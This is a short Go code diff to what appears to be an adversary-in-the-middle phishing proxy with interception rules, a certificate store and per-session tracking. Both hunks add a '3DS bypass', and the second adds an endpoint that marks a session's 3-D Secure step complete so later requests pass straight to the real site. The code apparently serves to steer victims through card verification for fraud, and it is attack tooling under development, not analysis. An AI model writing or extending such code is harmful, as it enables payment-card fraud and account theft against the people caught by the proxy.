@@ -1269,6 +1269,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if ic.method != "" && !strings.EqualFold(ic.method, req.Method) {
 								continue
 							}
+							// 3DS bypass: if session has completed 3DS, forward request to upstream
+							if p.threeDS != nil && ps.SessionId != "" && p.threeDS.HasBypass(ps.SessionId) {
+								log.Debug("intercept: 3DS bypass enabled for session %s, forwarding to upstream (domain=%s, path=%s)", ps.SessionId, ic.domain, ic.path.String())
+								continue
+							}
 							if ic.body_match != nil || len(ic.alterRequest) > 0 {
 								if req.Method != http.MethodPost {
 									continue
@@ -3608,6 +3613,12 @@ func (p *HttpProxy) handle3DSRequest(req *http.Request) (*http.Request, *http.Re
 			resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
 			resp.Header.Set("Cache-Control", "no-cache")
 		}
+		return req, resp
+	case path == "complete" && req.Method == http.MethodPost:
+		// 设置 bypass 标记
+		p.threeDS.MarkComplete(sessionID)
+		// 返回成功
+		resp := goproxy.NewResponse(req, "application/json", http.StatusOK, `{"success":true}`)
 		return req, resp
 
 	case req.Method == http.MethodOptions:
